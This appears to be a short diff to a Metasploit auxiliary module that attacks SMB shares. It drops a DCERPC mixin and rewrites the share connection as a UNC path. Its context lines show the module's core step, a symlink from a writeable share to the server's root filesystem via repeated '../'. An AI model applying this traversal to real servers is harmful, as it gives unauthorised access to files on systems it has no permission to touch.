@@ -16,7 +16,6 @@ require 'msf/core'
 class Metasploit3 < Msf::Auxiliary
 
 	# Exploit mixins should be called first
-	include Msf::Exploit::Remote::DCERPC
 	include Msf::Exploit::Remote::SMB
 	include Msf::Auxiliary::Report
 
@@ -57,7 +56,7 @@ class Metasploit3 < Msf::Auxiliary
 		smb_login()
 
 		print_status("Trying to mount writeable share #{datastore['SMBSHARE']}...")
-		self.simple.connect(datastore['SMBSHARE'])
+		self.simple.connect("\\\\#{rhost}\\#{datastore['SMBSHARE']}")
 
 		print_status("Trying to link '#{datastore['SMBTARGET']}' to the root filesystem...")
 		self.simple.client.symlink(datastore['SMBTARGET'], "../" * 10)
